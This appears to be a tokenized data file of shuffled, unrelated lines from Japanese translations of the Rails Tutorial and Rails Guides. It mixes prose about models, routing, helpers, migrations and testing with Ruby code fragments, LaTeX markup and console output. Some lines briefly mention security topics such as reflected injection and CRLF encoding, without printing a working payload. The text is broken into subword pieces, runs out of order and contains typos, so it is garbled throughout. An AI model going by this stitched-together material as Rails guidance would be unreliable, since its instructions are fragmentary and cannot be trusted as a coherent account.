▁ / ▖ bundle
▁#### ▁ プレースホルダ を使用した 条件
▁このメソッド には 破壊的な バージョンの ` String # remove !` もあります 。
▁TIP : ▁ 後に 解説します が 、 `@ article ▖ save ` は 保存 に 成功 した かどうかを 真 偽 値 ▁( true または false ) ▁ で 返します 。
▁これ を行う お お よ その 流れ は 、 有効化トークン や ダイジェスト を ユーザー と 関連付け 、 ユーザーに メールを送信 し 、 その メール には トークン を含む リンクを 記載 しておき 、 ユーザーが その リンクをクリックすると 有効化 できるように なる 、 という ものです 。
▁上 述 した 多くの 演算子 を コンソール セッション 上で 実行 して 比較してみると 、\ text tt {@ user ▁= ▁@ user ▁|| ▁value } は 「\ text tt { x ▁= ▁x ▁O ▁ y }」 の パターン に 該 当 し 、\ text tt { O } が \ text tt {||} に置き 換 わ った だけ の もの である ことがわかります ▟ ということは 、 この 演 算 は 以下 と同じ であること が 推 測 できます 。
▁ o ") ▁# ▁=> ▁true
▁Rails コンソール を 起動 し 、 example \_ user の コードを \ k ode { require } して 、 自 作 した クラスを 試 し に 使って みましょう 。
▁{0} 図 5 ▖5{/0}{1} タ イ ポ グ ラ フ ィ ー スタイル を追加する ▟\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ typography _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁ デフォルトの Rails アプリ 構造 ▁( 図 \ ref { fig : directory _ structure _ rails }) ▁ を 眺 め てみると 、\ k ode { app / } という ディレクトリ があり 、 その中に 「\ k ode { models }」 「\ k ode { views }」 「\ k ode { controllers }」 という 3 つの サブディレクトリ がある ことに 気付いた方もいると思います 。
▁ リ フ レ ク ション インジェクション ▁( Re f le c ted ▁injection ) ▁ 攻 撃 も 同様 の 攻 撃 です ▟ 標的ユーザー に 後 で表示される ペ イ ロー ド が保存され て お らず 、 実際には URL に 長 大 な 文字列 として 仕 込 まれ ています 。
▁include ▁ ActiveModel :: Validations
▁ 身 近 に Rails 使い が い ない場合は 、 I R C ル ーム や rails - core メ ー リ ング リスト で お 問い合わせ ください 。
▁作成した コードをリスト \ ref { code : relationship _ belongs _ to } に示します
▁def ▁read _ cookie
▁`@ article ▖ save ` が 失敗した ら その ことを ユーザーに 表示 して あ げ ない と 不 親 切 です 。
▁| ▁GET ▁| ▁ / geocoder ▁| ▁ geocoder s # show ▁| ▁1 つ しか ない geocoder リソース を表示する ▁|
▁ これが その 原 因 です 。
▁scope ▁: inactive , ▁-> ▁ { ▁re where ▁state : ▁' inactive ' ▁ }
▁return ▁unless ▁cache _ configure d ?
▁上の例では 、 ネスト の内側に ある \ k ode { h 1 } という ルール は 、\ k ode { ▖ center } の ルール を継承し ています 。
▁[ master ▁( root - commit ) ▁d f 0 a 6 2 f ] ▁Initialize ▁repository
▁ レイアウトファイル の 役 割 については この後 説明します が 、 まずは 作業 開 始 前に レイアウトファイル の ファイル名 を変更 しておきましょう 。
▁( Application ヘルパー を インクルード することで 、 リスト \ ref { code : title _ helper } の \ k ode { full \_ title } ヘルパー が 利用 でき ている点に注目してください ) 。
▁ エンジン はこの 名前 を使用して ` User ` オブジェクト を新規作成する か 、 その 名前 が 既に ある かどうか を調べ ます 。
▁ これはリスト \ ref { code : a _ test _ for _ invalid _ submission } で使用されていました 。
▁( スクリーンキャスト は 、 このような 一 からの 手 作り 開発 手順を 解説 するのに 向 い ています ▟ この 課題 を 十分 に 理解 したい 方は 「\ href { http :// railstutorial ▖ org / screencasts } { Ruby ▁on ▁Rails ▁Tutorial ▁ screencasts } ▁( 英語 )」 を参照してください ) 。
▁{0} 図 5 ▖ 8 {/0} ▁{1} \ href { http :// localhost :3000/ about }{/ about } で表示される About ページ {/1}
▁resources ▁: photos , ▁path _ name s : ▁ { ▁new : ▁' make ', ▁edit : ▁' change ' ▁ }
▁ ある コレクション の内容 が 空 で あった ら どう なる か 。
▁def ▁set _ expert _ locale
▁ テスト 環境 の デバッグ など 、 他の 環境で console を実行する 必要 が生じ た場合 は 、 環境 を パラメータ として \ text tt { console } スクリプト に 渡す ことができます 。
▁ 顧客 と 、 顧客 の 注文 を まとめて 削除 する 作業 は さらに 簡単です 。
▁この サブ セレクト は 、 集合 の ロ ジ ッ ク を ▁( Rails ではなく ) ▁ データベースに保存 する ので 、 より 効率 が 高 まり ます
▁<% ▁@ article ▖ comments ▖ each ▁do ▁| comment | ▁%>
▁ 111▖2345 ▖ to _ s (: rounded , ▁significant : ▁true ) ▁# ▁=> ▁1 11
▁else
▁` config / application ▖ rb ` および 環境 固有の 設定ファイル ( ` config / environments / production ▖ rb ` など ) に 設定 を 記 入 することで 、 Rails の すべての コンポーネント に それらの 設定 を渡すことができます 。
▁< div ▁class =" field _ with _ errors ">
▁$ ▁ cd ▁ ▖ ▖
▁Client ▖ order (" orders _ count ▁ASC ")▖ order (" created _ at ▁DESC ")
▁validates ▁: name , ▁uniqueness : ▁ { ▁scope : ▁: year ,
▁Contact ページのビュー を追加する ▁( ▁\ passing ▁ )
▁* ▁Action ▁View で 提供され る ヘルパー の 紹 介 と 、 カスタム ヘルパー の作成 法
▁ ルーティング は既に 定義されている ので 、 リクエスト は アプリケーションの ` / articles / new ` に 送 られます 。
▁* ▁` collection ▖ where (▖▖▖)
▁図 \ ref { fig : login _ success _ mockup } では 、 ログアウト のリンク と プロフィール のリンク は ▁[ Account ] ▁ メニュー の 項目 として 表示 されている 点にご注目ください ▟ リスト \ ref { code : layout _ login _ logout _ links } では 、 Bootstrap を使用して このような メニュー を 実現 する方法 を示します 。
▁ フォーム タグ を作成するための メソッドを 多数 提供し ます ▟ これらの メソッドは 、 テンプレート に割り当てられ ている Active ▁Record オブジェクト に依存し ない 点が Form Helper と 異なります 。
▁* ▁ リクエスト から パラメータを パ ー ス して 、` params ` を設定します 。
▁t ▁= ▁Time ▖ local (201 0, ▁3 , ▁28 , ▁1, ▁ 59 , ▁ 59 )
▁### ▁` ActiveSupport :: Callbacks ` では 明示的に ブロック を使用すること
▁リスト \ ref { code : footer _ css } のとき
▁ リレーション の 構 築 時に ` lock ` を使用すると 、 選択 した 行 に対する 排 他 的 ロック を 取得 できます 。
▁ 特に 、 Rails のルーティング システム は モデル に対して ` to _ param ` メソッド を実行する ことで 、`: id ` プレースホルダ の値 を取得し ています 。
▁ ここに ある 、 フォローしているユーザー 用 と フォロワー 用の 名前付きルート を この後 使用します 。
▁Rails ▁console で 動作 を確認する と 、 期待どおり \ k ode { admin } 属性 が追加され て 論理値 を と り 、 さらに 疑問符 の 付 いた \ k ode { admin ?} メソッド も 利用できる ようになっています 。
▁ 単語 が 回 文 である かどうかを確認 できる ということです
▁ユーザー から 提供され た データ に対して ` image _ tag ` などの ヘルパー を使用する場合 は ご注意ください 。
▁この節では 、\ emph { ステータスフィード } ▁( 第 \ ref { cha : following _ users } 章で 完成させます ) ▁ の最初の ヒント をお見せします 。
▁(\ k ode { users } テーブル を 作る ための ) ▁User モデルの マイグレーション
▁# ▁=> ▁ ActiveSupport :: Hash With I ndifferentAccess
▁ この動作 は 、` Array # map ` を使用して ` deep _ dup ` メソッドを 内部 の各 オブジェクト に 適用 する の と似ています 。
▁詳細については Rails ガイド の 「\ href { http :// guides ▖ rubyonrails ▖ org / asset _ pipeline ▖ html } { アセットパイプライン }」 の 項 を参照してください 。
▁デフォルトは ` true ` であり 、 この場合 関連付けられたオブジェクト は 保存 時に 検証 されます 。
▁\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁adding _ page _ title s ▁( end )╼╼ ▁\ subsection { レイアウト と 埋め込み Ruby ▁( Refactor )} ▁% ▁( fold )╼ ▁\ label { sec : layouts _ and _ embedded _ ruby }╼╼
▁上のコードでは 、 Rails は自動的に は て な マーク ▁" ? " ▁ を \ k ode { about _ path } に 置 換 しています ▁( このとき ▁" about _ path " ▁ 内に 特 殊 記 号 があれば エスケープ 処理 されます )▟ これにより 、 次のような HTML があるかどうかをチェック することができます 。
▁ セキュア に ハッシュ化 した パスワードを 、 データベース 内の \ k ode { password \_ digest } という 属性 に保存 できるように なる 。
▁d ▖ beginning _ of _ quarter ▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010
▁< li >`: user _ name ` ▁- ▁ メール サーバー で 認 証 が必要な場合は ここで ユーザー名 を指定する ▟ </ li >
▁* ▁` app / views / layouts / new s ▖ html ▖ erb `
▁### ▁ 属性
▁リスト \ ref { code : password _ reset _ update _ action } の実装 では 以下のコード を使用して 、 パスワード再設定の 期限切れ の 論理値 テストを User モデルに 委譲 ▁( delegate ) ▁ しています 。
▁TIP : ▁Active ▁Record は 、 データベースの カラム名 と モデルの 属性 を自動的に 対応 付ける イン テ リ ジ ェ ン ト な 機能を 有 しています ▟ この おかげで 、 Rails の モデル では 属性を い ち い ち 宣言 する 必要がありません ▟ そう した 作業 は Active ▁Record が自動的に や って く れ ます 。
▁リスト \ ref { code : a _ test _ for _ invalid _ submission } のとき と同じ は 、 次のように テストを 書き ましたが
▁今回の場合 、 上のコード を参考に 下 のような コードを し よう しま s
▁select _ datetime ( Time ▖ now ▁+ ▁4 ▖ day s )
▁ フォームの remote オプション が オン になっている ので 、 リクエスト は Ajax リクエスト として ` UsersController ` に渡され 、 JavaScript を探し ます 。
▁< h 1> New ▁article </ h 1>
▁ 簡単な のは ` has _ and _ belongs _ to _ many ` を使用する 方法 です ▟ この 方法 では 関連付け を直接 指定 できます 。
▁この スクリーンキャスト では 、 本書 の 話 題 をすべて カ バー している だけで なく 、 さまざまな コ ツ や 秘 訣 も 満 載 されており 、 ス ク リ ー ン シ ョ ッ ト だけで は 捉 え にくい 実際の 動作を 動 画 で 視 聴 することもできます 。
▁=> ▁[ 4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 , ▁10 , ▁ 11 , ▁ 12 , ▁1 3 , ▁ 14 , ▁ 15 , ▁ 16 , ▁17 , ▁ 18 , ▁ 19 , ▁20 , ▁2 1, ▁ 22 , ▁ 23 ,
▁ その前に 、 それぞれの 関連付け が 適切 となる 状 況 について 簡単に ご 紹 介 しましょう 。
▁これは 、 定数 を経由して モジュール オブジェクト に 到 達 できる という 意味 です 。
▁このメソッドは 内部で ` javascript _ path ` を呼び出し ており 、 現在の ホスト または アセット 用の ホスト と マージ して URL を生成します 。
▁これで 、 失敗する テストは Home ページを 残 す だけ となり ました 。
▁ 必要な User モデルオブジェクト を作成する ために 、 Active ▁Record を使用して \ k ode { User ▖ create } という 形式で ユーザー を作成する こともできます が 、 経験 上 、 ユーザーの オブジェクトを 定義 して それを データベースに 挿入する には 、 ユーザーの \ emph { ファクトリー ▁( factory )} ▁ を使用する 方が は る か に 便利です 。
▁ここまで の 準備 が完了し たら 、 いよいよ サンプルアプリケーションの 開発 を 始 め ましょう 。
▁Web ブラウザは ネイティブ では \ text tt { PATCH } リクエスト ▁( 表 \ ref { table : RESTful _ users } で REST の慣習 として 要求 されている ) ▁ を 送信 できない ので 、 Rails は \ text tt { POST } リクエスト と 隠 し \ k ode { input } フィールド を利用して PATCH リクエストを 「 偽 造 」 しています
▁上の URL における " % 0 d % 0 a " は " \ r \ n " が URL エンコード された もの であり 、 Ruby における CRLF 文字 です 。
▁ 先ほど 実装 した RSpec のテスト を実行します 。
▁GR O U P ▁BY ▁date ( created _ at )
▁* ▁ ジョブ の 登録 方法
▁[ クラス 属性 ](# class 属性 ) も 参 照 してください 。
▁最後に 、 以下のように プロファイル へのリンク も 追加します 。
▁issue レポート には 、 最 低 でも タイトル と issue の 明 快 な 説明 が必要です 。
▁ ページ タイトル が正しく 表示 されない 問題 を解決する ために 、\ k ode { full _ title } という ヘルパー を作成する ことにします 。
▁{0} 図 10 ▖6{/0}{1} ユーザープロファイル ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) ▁ と スタイル の ない マイクロポスト ▟\ href { http :// railstutorial ▖ org / images / figures / user _ profile _ microposts _ no _ st y l ing _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁### ▁ sass - rails
▁ ユーザーが メールの リンクを クリック したら 、 アプリケーションは メールアドレスを キー に して ユーザー を探し 、 データベース 内に 保存 して お いた 再設定 用 ダイジェスト と 比 較 することで トークン を 認 証 する 。
▁self を省略した 結果を リスト \ ref { code : activation _ digest _ test } に示します 。
▁` config / environments / development ▖ rb ` を更新し て 以下のように することで 、 ダイジェスト をオフに できます 。
▁create ▁app / views / blorgh / articles / _ form ▖ html ▖ erb
▁続いて 、` Blorgh :: Article ` モデルの 設定 を この 新しい 設定 に切り替え ます 。
▁t ▖ belongs _ to ▁: assembly
▁\ k ode { cat } コマンドで 公開鍵 を出力する 。
▁gem ▁' sass - rails ', ▁' ~ > ▁3▖1 ▖ 7 '
▁Rails では 、「 関連付け ( ア ソ シ エ ー ション : ▁association )」 とは 2 つの Active ▁Record モデル 同士 の つながり を指します 。
▁\ ref { sec : a _ problem _ with _ the _ data _ model } で 指 摘 した ように 、 Twitter の慣習 に したがって フォロー 数 の 単 位 には “ following ” を使い 、 たとえば “ 50 ▁following ” といった 具 合 に 表示 します 。
▁flash [: symbol ] ▁= ▁" a ▁symbol "
▁Relationship s コントローラで Ajax リクエスト に対応する
▁\ k ode { dependent : ▁: destroy } オプション を使うと 、 関連付け された オブジェクトが 削除され ると 同時に 、 自分自身 も 削除 する
▁Client ▖ includes (" orders ")▖ where ( first _ name : ▁' Ryan ', ▁orders : ▁ { ▁status : ▁' receive d ' ▁ }) ▖ count
▁route ▁get ▁" users / new "
▁# ▁ Word が 鏡 文字 かどうか
▁" Home ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App "
▁この コマンド が 効 か ないこと も 多 い ので 、 その ときは いよいよ \ text tt { p kill } コマンドで \ text tt { spring } の名前 を指定して kill します 。
▁\ k ode { relationships } テーブルに インデックス を追加する
▁# ▁=> ▁[" David "]
▁` with _ indifferent _ access ` メソッドは 、 レシーバ に対して ` ActiveSupport :: Hash With I ndifferentAccess ` を 実行 した結果 を返します 。
▁1▖ ordinal ▁# ▁=> ▁" st "
▁< video ▁src ="/ video s / mov i e ▖ ogg " ▁/>
▁ 私たちは ここで 、\ k ode { create } アクション で フォーム 送信 を受け取り 、\ k ode { User ▖ new } を使用して 新しい ユーザー オブジェクト を作成し 、 ユーザーを 保存 ▁( または 保存 に 失敗 ) ▁ し 、 再度 の 送信 用の ユーザー登録ページ を表示する という 方法で 機能を実装し よう と思います 。
▁ モデルを 手 作り した のです から 、 それ に 合 った コントローラ も 作 って み た く なります 。
▁Rails で 好 まれ ている \ href { http :// en ▖ w ikipedia ▖ org / wiki / Re presentational _ State _ Transfer } { REST アーキテクチャ } の 規 約 に従い 、 新規ユーザー 用の アクションを \ k ode { new } とします ▟ したがって 、\ k ode { generate ▁controller } の 引数に \ k ode { new } を渡して 、 自動的に アクション を作成し てみましょう 。
▁ スコープ ブロック を使用して このような カスタマイズ を行う ことができます 。
▁# ▁ 例外 発生
▁def ▁pa id _ with _ card ?
▁* ▁` build _ middleware _ stack `: ▁ アプリケーションの ミドルウェアスタック を 構成 し 、` call ` メソッド を持つ オブジェクトを返します ▟ この ` call ` メソッドは 、 リクエスト に対する Rack 環境 の オブジェクト を引数に取り ます 。
▁=> ▁17
▁ ルーティング の 調 査 と テスト
▁Rails の ビュー では 膨大な 組み込み 関数 を使用する ことができます が 、 それ に 加えて 新しい 関数 を作成する こともできます 。
▁しかし 幸 運 な ことに 、 Rails では フォーム 用の テストを書く ことができ 、 こういった プロセス を 自動化 することができます 。
▁get ▁' * path ', ▁to : ▁' b la c k list # index ',
▁これは 、` to _ formatted _ s ` または ` to _ s ` を 単 に 呼び出す と 、 エ ン ジ ニ ア リ ング 記 法 ▁( ' 0▖5 E 1 ' のような 記 法 ) ▁ ではなく 浮 動 小 数 点 記 法 を 得 られる ということです 。
▁このメソッドは 、 例外 クラス を表す 任意の 数値 を受け取り ます 。
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁config ▖ assets ▖ raise _ run time _ errors ▁= ▁false
▁# ▁=> ▁Mon , ▁ 02 ▁A ug ▁2010 ▁23:2 1 : 11 ▁UTC ▁+00:00
▁ 表 \ ref { table : valid _ email _ regex } の 正規表現 を 適用 して \ k ode { email } の フォーマット を 検証 した結果 を 、 リスト \ ref { code : validates _ format _ of _ email } に示します 。
▁class ▁User ▁< ▁ActiveRecord :: Base
▁#### ▁ Class # class _ eval を使用して decorator パターン を実装する
▁上 は以下のように できます 。
▁* ▁` mail ` ▁- ▁ 実際の メール ・ メッセージ です ▟ ここでは `: to ` ヘッダー と `: subject ` ヘッダー を渡して います 。
▁fixture ファイルに 2 人目のユーザー を追加する
▁fixture は 、 関連付け を使った オブジェクト の作成 も サポート と している
▁self を省略した 結果を リスト \ ref { code : signin _ form } に示します 。
▁- 2 1 ▖ ordinalize ▁# ▁=> ▁" - 2 1 st "
▁Capybara は \ emph { Web r at } の 後 続 プロジェクト であり 、 世界 \ href { http :// en ▖ w ikipedia ▖ org / wiki / Capybara } { 最大 の 齧歯 類 } が 名前 の 由 来 です 。
▁たとえば 、 悪意のある ユーザ が マイクロポストの \ k ode { user _ id } 属性を 改 変 し 、 別の ユーザ に マイクロポストを 関連 づ け る 事 も 可能です 。
▁Relationship モデル のバリデーション をテストする
▁Active ▁Record オブジェクトを 出力 するための コンテナ 作成 方法 には これ を使う ことをお勧めします ▟ この 方法 であれば 、 適切な クラス と id 属性 が コンテナ に 追加される からです 。
▁たとえば 、 次のような コード では
▁ 例外 の 発生 後 、 この 例外 を レ ス キュー することで 衝 突 を解決する 必要があります ▟ 衝 突 の 解決 方法は 、 ロールバック 、 マージ 、 または ビ ジ ネ ス ロ ジ ッ ク に応じた 解決 方法 のいずれか を使用してください 。
▁* ▁h im または her ▁-> ▁them に置き換える
▁ これらは Rails によって 挿入され ている もの で 、 サーバー 上で 変更 が あった 場合に ブラウザ が CSS を再読み込みする の に 使用します ▟)
▁ この時点で サンプルアプリケーション は かなり 実 用 的 になって きました が 、 まだ 重要な 機能 がいくつも 残 っています 。
▁ 注 : ▁以前のバージョン の Rails では 、\ k ode { rails ▖ png } という ロゴ マーク が自動的に すべての Rails プロジェクト に インストール していました が 、 最新 バージョンの Rails では \ k ode { rails ▁new } による 生成 時に この ロゴ マーク を含め なくなりました ▟ この ロゴ マーク が 必要な 方は 、 Ruby ▁on ▁Rails 公式 ページ ▁(\ href { http :// rubyonrails ▖ org / images / rails ▖ png } { http :// rubyonrails ▖ org / images / rails ▖ png }) ▁ から ダウンロード して \ k ode { app / assets / images / } ディレクトリに おいてください
▁ユーザーの フォロワー 用 ページのモックアップ
▁else
▁ただし さ さ い な ことで は あります が 、 マイクロポストの 投 稿 が \ emph { 失敗する } と 、 ▁Home ページ は \ k ode {@ feed _ items } インスタンス変数 を 期 待 している ため 、 現 状 では 壊 れ てしまいます ▁( この ことは テストスイート を実行して 確 認 できます ) 。
▁Client ▖ connect ion ▖ select _ all (" SELECT ▁first _ name , ▁created _ at ▁FROM ▁clients ▁WHERE ▁id ▁= ▁'1' ")
▁\ emph { A synchronous ▁( 非同期 の ) ▁JavaScript ▁And ▁ XML } の ╼ それぞれの 頭 文字 を と っています ▟ Ajax は し ば し ば ▁“ A J A X ” ▁ と 大文字 で 書かれ ますが 、\ href { http :// www ▖ adapt ive path ▖ com / ide as / ajax - new - app r o a ch - web - application s /}{ Ajax の 起 源 となる 記事 } では 一 貫 して ▁“ Ajax ” ▁ と なっています 。
▁` rails ▁console ` の 出力 で 様 子 を 観 察 してみます 。
▁` Hash # to _ query ` メソッドは 、 それらの キー に対して 名前空間 を オプションで 与 え ることもできます 。
▁ 厳 密 な バリデーション
▁このメソッドは 、 エスケープ されていない ` key ` を 受け取る と 、 その キーを ` to _ param ` が 返す 値 に 対応 させる クエリ 文字列 の一部 を生成します ▟ ただし ハッシュ は 例外 です ( 後 述 ) 。
▁* ▁` config ▖ console ` を使用すると 、 コンソール で ` rails ▁console ` を実行する 時に 使用される クラスを カスタマイズ できます 。
▁initializer ▁" action _ controller ▖ set _ helpers _ path " ▁do ▁| app |
▁これらの ファイルを 名前空間化され た ディレクトリに 配置 することで 、 他の エンジン や アプリケーションに 同じ 名前 の コントローラ が あって も 名前 の 衝 突 を 避ける 事 が できます 。
▁ユーザー登録 が 失敗した とき のモックアップ 。
▁### ▁` confirmation `
▁作成した コードをリスト \ ref { code : following _ followers _ action s } に示します
▁以下は [ J s ▖ Y a man n er @ m ]( http :// www ▖ s ymantec ▖ com / security _ response / write up ▖ js p ? doc id = 2006 - 06 12 11 - 4 1 11 - 99 & tab id = 1 ) ▁ Y a h oo ! ▁ Mail ▁[ ワーム ]( http :// gr oo v in ▖ net / stuff / y a m m er ▖ t x t ) ▁ からの 抜 粋 です 。
▁ メール送信 時に テンプレート の レンダリング を スキップ して メール 本 文 を 単 なる 文字列 にした くなる ことがあります 。
▁ ╼\ end { code }╼\ end { code listing }╼╼ ╼ ▁% ▁subsection ▁testing _ title s ▁( end )╼╼ ▁\ subsection { タイトル を追加する ▁( Green )} ▁% ▁( fold )╼ ▁\ label { sec : adding _ page _ title s }╼╼
▁`: only _ integer ` を ` true ` に設定する と 、
▁ / login
▁` lock ` を使用する リレーション は 、 デ ッ ド ロック 条件 を 回 避 するために 通常 ト ラン ザ ク ション の内側に ラ ッ プ されます 。
▁` parent s ` メソッドは 、 レシーバ に対して ` parent ` を呼び出し 、` Object ` に 到 着 する まで パス を さ か の ぼ ります 。
▁base _ title
▁上のコード で 、 シンボル \ k ode { : length } や 文字列 \ k ode { ’ length ’} を \ k ode { send } メソッドに 渡 しています が 、 これは 与えられた オブジェクト ▁( ここでは a ) ▁ の \ k ode { length } メソッドを呼び出す こと と 完全に 同等です 。
▁| ▁| ▁50 5 ▁| ▁: http _ version _ not _ support ed ▁|
▁{0} 図 10 ▖ 18 {/0} {1} 非常に 長い 単語 によって 崩 れ た レイアウト ▟\ href { http :// railstutorial ▖ org / images / figures / long _ word _ micropost _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / qualified _ const ▖ rb ` です 。
▁ これまで の例 と同様 、\ k ode { expect } を使用して ブロック 内の 操作を まとめ 、 関連する カウント を 1 増 や したり 減 ら したり する テストを 行 なっています 。
▁### ▁` alias _ method _ chain `
▁" "▖ html _ safe ?
▁ 文字列
▁t ▖ integer ▁: publish er _ id
▁この ヘルパー を定義する ことで 、 Home ページに これまで 表示され ていた 余分な 「 Home 」 という 単語 を 表示 せず 、 基本 タイトル のみ を 正しく 表示する ことも できるようになります 。
▁ 検索 メソッドに 条件 を追加 したい場合 、 たとえば ` Client ▖ where (" orders _ count ▁= ▁' 2 ' ") ` のように 条件 を 単 純 に 指定 することができます 。
▁class ▁Create Employee s ▁< ▁ActiveRecord :: Migration
▁ 完全な コマンド
▁なお 、 本番環境で User モデル を使う ためには 、\ k ode { heroku ▁run } コマンド を使って Heroku 上で も マイグレーション を 走 ら せる 必要があります 。
▁# ▁ Requir es ▁support ing ▁ ruby ▁files ▁with ▁custom ▁match ers ▁and ▁ macro s , ▁etc ,
▁User モデルに ユーザー 有効化 メソッド を追加する
▁ ところで 、 Gravatar へのリンク で \ k ode { target =" _ blank "} が 使われ ています が 、 これ を使うと リンク 先 を 新しい タブ ▁( または ウィンドウ ) ▁ で 開 く よう になるので 、 別の Web サイト へ リンク するとき など に 便利です 。
▁ バージョン管理 システム にも さまざまな もの があります が 、 Rails コ ミ ュ ニ テ ィ では Linux カ ー ネ ル 用に L in us ▁To r val d s により 開発 された 分 散 バージョン管理 システム である \ href { http :// git - s cm ▖ com /}{ Git } が 主 流 になっています 。
▁{0} 図 6 ▖9{/0} ▁{1} SQLite データベース \ k ode { db / development ▖ sqlite 3 } に 登録 された ユーザーの 行 {/1}
▁もし パフォーマンス の 問題 が発生する ようなことがあ れば 、\ href { http :// rails lab ▖ new rel ic ▖ com / s caling - rails } { E n v y ▁L abs } の G re g g ▁P o ll ac k が 著 した この \ href { http :// env y lab s ▖ com /}{ S caling ▁Rails } シ リ ー ズ を参照 することから始め る のが よいでしょう 。
▁# ▁automatically ▖
▁これにより 、 リスト \ ref { code : index _ final _ refactoring } のコードは 極めて コンパクト になります 。
▁invoke ▁active _ record
▁### ▁` inquiry `
▁\ k ode { bundle ▁install } に 特殊な フラグ 「 - - with out ▁production 」 を追加する と 、 本番 用の gem ▁( この場合は \ text tt { pg } と \ text tt { rails \_ 12 factor }) ▁ は ローカル の 環境 には インストール されません 。
▁Rails で scaffold や コントローラを生成 すると 、 JavaScript ファイル ▁( ` coffee - rails ` ▁gem が ` Gemfile ` で 有効 になっている 場合は CoffeeScript ) ▁ と CSS ▁( ` sass - rails ` ▁gem が ` Gemfile ` で 有効 になっている 場合は SCSS ) ▁ も その コントローラ 用に 生成されます 。
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁ASC ▁LIMIT ▁3
▁< p > A ▁ product ▁of ▁D an is h ▁De sign ▁during ▁the ▁Wi n ter ▁of ▁' 7 9 ▖▖▖ </ p >
▁ 通常の アプリケーション と 異なる 点 は 、 これらの ディレクトリ の下に は さらに エンジン 名 を持つ サブディレクトリ がある ことです 。
▁` has _ and _ belongs _ to _ many ` 関連付け で 使用している 中 間 の 結合テーブル が 、2 つの 外部キー 以外に 何か カラム を 含 んで いる場合 、 これらの カラム は 関連付けを 介 して 取り 出 される レコード に 属性 として 追加 されます 。
▁scaffold 生成 時に は 、 さらに scaffold s ▖ css ▁( ` sass - rails ` ▁gem が ` Gemfile ` で 有効 になっている 場合は scaffold s ▖ css ▖ scss ) ▁ も 生成されます 。
▁" active "▖ inquiry ▖ inactive ?
▁ アセット は gem の 形式で 外部 ソース から 持ち 込 む こともできます 。
▁ 新しい Rails では ` sanitize ` メソッド が更新され 、` L oo fa h :: S crubber ` を使用して 強力な ス ク ラ ブ を 行なうことができます 。
▁ Linux の場合 、\ k ode { a p t - get } または \ k ode { y um } を使用して 同様に インストール できます 。
▁Sessions ヘルパーは ビュー と コントローラ の両方 で メソッドが 必要となる ので 、 コントローラ では 上の ように 明示的に インクルード する必要があります 。
▁ サンプルアプリケーションの コア 部分を 開発 するために 、 これまで に ユーザー 、 セッション 、 アカウント有効化 、 パスワード リ セット という 4 つの リソース について 見 てきました ▟ そして 、 これら のうち 「 ユーザー 」 という リソース だけ が 、 Active ▁Record によって データベース上の テーブル と 紐 付 い ています 。
▁ 別の 言い 方 を すれば 、 ログ オン していない ユーザーが 編集 ページ にアクセス し よう として いた なら 、 ユーザーが サインイン した 後に はその 編集 ページ にリダイレクトされる ように する の が望ましい 動作 です 。
▁### ▁Action ▁Pack
▁たとえば offset ( 11 ) と 指定 すると 、 最初の 11 レコード は スキップ され 、 12 レコード 目 から 返される ようになります 。
▁middleware s ▁<< ▁[ Rails :: Rack :: Debugger ] ▁if ▁options [: debugger ]
▁ } ▖ ╼╼ \ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : beginning _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁get ▁' : controller ( / : action ( / : id ) ) '
▁@ assembly ▁= ▁@ part ▖ assemblies ▖ create ( { assembly _ name : ▁" Trans mis s ion ▁h ous ing " })
▁* ▁ エンジン を アプリケーションに フック する
▁{0} 図 10 ▖ 15 {/0} {1} 新しいマイクロポスト を作成 後 の Home ページ ▟\ href { http :// railstutorial ▖ org / images / figures / micropost _ created _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ アカウント有効化 メイラー の テキスト ビュー ▁( 自動生成 )
▁{0} 図 11 ▖ 14 {/0} ▁{1} 試 作 フィード のある Home ページ {/1}
▁=> ▁false
▁ 現 状 では 、 有効な 情報 で 送信する と エラーが発生し てしまいます 。
▁=> ▁" development "
▁HTML から HTML タグ をすべて 削除します ▟ HTML コメント も 削除 されます 。
▁client ▖ save
▁ 種類 が ` email ` の 標準 入力 フィールド を作成します 。
▁以下の 関連付け を例にとって 考えてみましょう 。
▁ これまで CDN が アセットを キャッシュ するのに 向 い ている と 説明しました が 、 実際に キャッシュ されている のは アセット 単 体 ではなく リクエスト 全体 です 。
▁以下は Base c amp で 実際に 使用されている RSS 出力 コードを そのまま 引 用 した ものです 。
▁\ href { http :// localhost :3000/ about }{/ about } で表示される About ページ
▁ ブラウザで ` doc / api / index ▖ html ` を開いて API ドキュメント を参照 できます 。
▁client ▖ visit s ▁ += ▁1
▁しかし 実際には 、 マイクロポストを ユーザー と \ emph { 関連付け る ▁( associate )} ▁ 必要がある ため 、 ポスト の オーナー を 記 録 するための \ k ode { user _ id } も 追加します 。
▁ここでは 、 説明 が必要 と 思 わ れる もの について のみ 補 足 します 。
▁ さ て 、 今回の テストで 唯 一 の 手 の 込 んだ 箇所 は 、 管理者 が 削除リンク を クリック したときに 、 ユーザーが 削除 された ことを確認する 部分 です ▟ 今回は 次のような テストで これを実現 しました 。
▁\ ref { sec : a _ user _ class } で 、\ emph { マスアサインメント } の 概念 について 簡単に 説明しました ▟ これは 、 以下のように 値 の ハッシュ を使用して Ruby の 変数 を 初期化 する ものです 。
▁ ハッシュ は 配列 と似ています が 、1 つの 重要な 違い として 、 ハッシュ では 要素 の 「 並び順 」 が 保 証 されない という 点 があります
▁ ある コントローラのアクション から 、 まったく 別の コントローラの 配 下 にある テンプレート を使用して 出力 することは 可能 でしょうか 。
▁リスト \ ref { code : html _ structure } のとき
▁さらに 、 与えられた パスワードを セキュア に 認 証 できるように しました 。
▁Active ▁Record の オブジェクトは ハッシュ や ブロック から 作成 することができます ▟ また 、 作成 後に 属性を 手動で 追加 できます 。
▁### ▁ 計算
